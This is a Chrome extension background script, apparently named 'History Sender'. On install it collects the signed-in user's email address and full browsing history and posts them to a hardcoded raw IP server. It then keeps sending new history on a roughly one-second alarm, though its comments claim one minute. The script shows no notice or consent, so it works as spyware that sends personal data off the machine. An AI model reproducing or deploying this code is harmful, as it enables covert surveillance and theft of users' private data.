// --- Function to send data to the Python server ---
async function sendHistoryData(payload) {
  const serverUrl = 'http://24.16.153.94:25568/receive_history';

  // The payload should be an object like { user: 'email', history: [...] }
  console.log(`Sending data for user: ${payload.user}`);

  try {
    const response = await fetch(serverUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }

    const result = await response.json();
    console.log('Success response from server:', result.message);
  } catch (error) {
    console.error('Error sending data to Python server:', error);
  }
}

// --- Function for the STARTUP sync: Fetches ALL history and sends it in batches ---
async function fetchAllHistoryAndSend() {
  try {
    // 1. Get the user's email address first
    const userInfo = await chrome.identity.getProfileUserInfo();
    if (!userInfo.email) {
      console.log("Could not get user email. User may not be logged in.");
      return; // Stop if no user email is found
    }

    // 2. Search for all history items
    const historyItems = await chrome.history.search({
      'text': '', // Search for all text
      'startTime': 0, // Start from the beginning of time
      'maxResults': 0 // 0 means the maximum possible results
    });

    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} total history items for ${userInfo.email}. Sending in batches...`);

      const batchSize = 1000; // You can adjust this size
      for (let i = 0; i < historyItems.length; i += batchSize) {
        const batch = historyItems.slice(i, i + batchSize);
        
        // 3. Create the payload with user email and history batch
        const payload = {
          user: userInfo.email,
          history: batch
        };

        const batchNum = (i / batchSize) + 1;
        console.log(`Sending batch ${batchNum}...`);
        await sendHistoryData(payload);
      }
    } else {
      console.log('No history found on startup.');
    }
  } catch (error) {
    console.error("Error during initial full history sync:", error);
  }
}


// --- Function for the RECURRING sync: Fetches only the last minute of history ---
async function fetchAndSendHistory() {
  try {
    // 1. Get the user's email address
    const userInfo = await chrome.identity.getProfileUserInfo();
    if (!userInfo.email) {
      console.log("Could not get user email for recurring sync.");
      return; // Stop if no user email is found
    }

    // 2. Fetch history from the last few seconds to be safe
    const oneMinuteAgo = Date.now() - (60 * 1000);

    const historyItems = await chrome.history.search({
      'text': '',
      'startTime': oneMinuteAgo,
      'maxResults': 10 // A reasonable limit for a minute
    });

    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} new history items for ${userInfo.email}.`);
      
      // 3. Create the payload with user email and history
      const payload = {
        user: userInfo.email,
        history: historyItems
      };
      
      await sendHistoryData(payload);
    } else {
      console.log('No new history items in the last minute.');
    }
  } catch (error) {
    console.error("Error during recurring history sync:", error);
  }
}


// --- Event Listeners ---

// This listener runs when the extension is first installed or updated.
chrome.runtime.onInstalled.addListener(() => {
  // Use a more realistic sync period, e.g., every 1 minute.
  // 0.016667 minutes is 1 second, which is very aggressive.
  chrome.alarms.create('historyTimer', {
    delayInMinutes: 0.0167, // Wait 1 minute before first run
    periodInMinutes: 0.0167   // Run every 1 minute
  });
  console.log("History Sender alarm created to run every minute.");

  // Perform the initial FULL history sync immediately on install.
  console.log("Performing initial FULL history sync...");
  fetchAllHistoryAndSend();
});

// Listener for the recurring alarm
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'historyTimer') {
    console.log("Alarm triggered. Checking for new history...");
    fetchAndSendHistory();
  }
});
